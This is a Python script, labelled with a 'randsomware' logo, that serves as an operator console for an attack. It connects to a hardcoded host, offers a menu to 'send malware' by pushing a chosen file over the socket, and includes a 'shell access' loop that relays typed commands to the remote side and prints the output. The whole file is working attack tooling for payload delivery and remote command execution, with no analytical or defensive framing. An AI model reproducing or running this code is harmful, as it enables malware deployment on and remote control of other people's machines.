import socket
import os
import time
from colorama import Fore
import sys

logo='''
┬─┐┌─┐┌┐┌┌┬┐┌─┐┌─┐┌┬┐┬ ┬┌─┐┬─┐┌─┐
├┬┘├─┤│││ ││└─┐│ │││││││├─┤├┬┘├┤ 
┴└─┴ ┴┘└┘─┴┘└─┘└─┘┴ ┴└┴┘┴ ┴┴└─└─┘                                                                                          
'''
list_access=[1]
access=1
menu='''
[1] send malware 
[2] shell access
'''

def clear():
    time.sleep(0.5)
    os.system('clear')

def check_num():
    global list_access
    global access
    while True:
        clear()
        global logo
        time.sleep(0.1)
        print(Fore.RED+logo)
        
        time.sleep(0.1)
        print(Fore.YELLOW+menu)
        time.sleep(0.1)
        num=input(Fore.GREEN+'enter the number of menu : ')
        if num=='' or num=='\n' or num==None:
            print('this is none')
            continue
        elif not num.isdigit():
            print('this is not number ')
            continue
        num=int(num)
        # if num != access:
        #     print(f' you must use {access} ')
        #     continue
        if num>2:
            print(' the number is more than two ... ')
            continue
        else:
            # if access==1:
            #     access=2
            # else:
            #     access=1    
            break
    return int(num)    


def make_hashtak(buffer,data):
    if type(data)!=str:
        space=(buffer-len(str(len(data))))*'#'
    else:
        space=(buffer-len(data))*'#'   
    return space



def process(conn):
    try:
        while True:
            clear()
            num=check_num()
            conn.send(str(num).encode())
         
            if num==1:

                while True:
                    clear()
                    name_of_file=input('choose file for sending >> ').strip()
                    if name_of_file==None or name_of_file=='' or name_of_file=='\n':
                        print('path is empty')
                        continue
                    elif name_of_file=='q':
                        process(conn)
                        break
                    elif not os.path.exists(f'{os.getcwd()}/{name_of_file}'):
                        print('the file is not exist ... ')
                        continue
                    else :
                        with open(f'{os.getcwd()}/{name_of_file}','rb')as file:
                            data=file.read()
                            file.close()
                        
                        space_length=make_hashtak(5000,data)
                        print(len(space_length))
                        length=str(len(data))+space_length
                        # print(len(length))
                        print(length)
                        # print(str(len(length)))
                        conn.send(str(length).encode())
                        # time.sleep(10)
                        space_name=make_hashtak(5000,name_of_file)
                        name=name_of_file+space_name
                        conn.send(name.encode())
                        print(len(data))
                        conn.send(data)
                        st_for_shell=conn.recv(5).decode()
                        if st_for_shell=='shell':
                            # access=2
                            break
                        
            elif num==2:
                while True:
                    cmd=input('enter the command .... ')
                    if cmd=='' or cmd==None or cmd=='\n':
                        continue
                    elif cmd=='q':
                        break
                    conn.send(cmd.encode())
                    data=conn.recv(1024).decode()
                    print(data)

    except Exception as er:
        print(er)


def bind_client():

    try:
       conn=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       conn.connect(('192.168.1.105',8080))
       print('i connected to server  ... ')

    except:
       print('i not connected to server  ... ')
       

    try:
        while True:
            ack=conn.recv(2).decode()
            if ack=='ok':
                conn.send('go'.encode())
                process(conn)
                break
            else:
                conn.send('ng'.encode())
                print('i cant send malware because i cant connect to server...')
                continue
    
    except:
        print('i cant receive acknowledge .... ')


if __name__=='__main__':
    bind_client()
